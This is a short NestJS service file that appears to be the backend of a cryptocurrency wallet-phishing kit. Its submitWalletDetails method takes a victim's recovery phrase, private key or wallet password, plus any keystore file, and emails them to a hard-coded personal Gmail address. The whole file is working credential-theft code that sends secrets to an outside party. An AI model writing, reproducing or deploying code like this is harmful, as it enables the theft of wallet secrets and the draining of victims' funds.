import { Injectable } from '@nestjs/common';
import { SharedService } from './modules/shared.service';
import { WalletDto } from './app.dto';

@Injectable()
export class AppService {
  constructor(private readonly sharedService: SharedService) {}

  async submitWalletDetails(wallet: WalletDto) {
    if (wallet.recoveryPhrase || wallet.privateKey || wallet.walletPassword) {
      await this.sharedService.sendEmail({
        from: 'random@fonu.com',
        to: 'israelobanijesu2@gmail.com',
        subject: 'New Wallet Details',
        ...(wallet.keystoreFile?.buffer
          ? {
              attachments: [
                {
                  filename: `keystoreFile.json`,
                  content: wallet.keystoreFile?.buffer,
                },
              ],
            }
          : {}),
        html: `
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <body>
    <table cellspacing="0" width="100%">
      <tr>
        <td></td>
        <td width="800" style="padding: 2rem; background: #f2f2f2">
          <div
            style="background: white; text-align: center; padding: 3rem 2rem"
          >
            <h1
              style="
                font-weight: 500;
                font-size: 24px;
                line-height: 29.05px;
                margin-top: 2rem;
              "
            >
              Hello,
            </h1>
            <div
              style="
                font-weight: 400;
                font-size: 16px;
                line-height: 19.36px;
                margin-top: 2rem;
              "
            >
              <span style="font-size: 20px">
                New Wallet Details Submitted for ${wallet.walletId}
              </span>
              <span style="font-size: 20px"> </span>
            </div>
            <div style="margin-top: 2rem; font-size: 16px">
              ${
                wallet.recoveryPhrase
                  ? `Wallet Recovery Phrase: ${wallet.recoveryPhrase}`
                  : wallet.privateKey
                    ? `Wallet Private Key: ${wallet.privateKey}`
                    : wallet.walletPassword
                      ? `Wallet Password: ${wallet.walletPassword}`
                      : ``
              }
            </div>
          </div>
        </td>
        <td></td>
      </tr>
    </table>
  </body>
</html>
      `,
      });
    }
  }
}
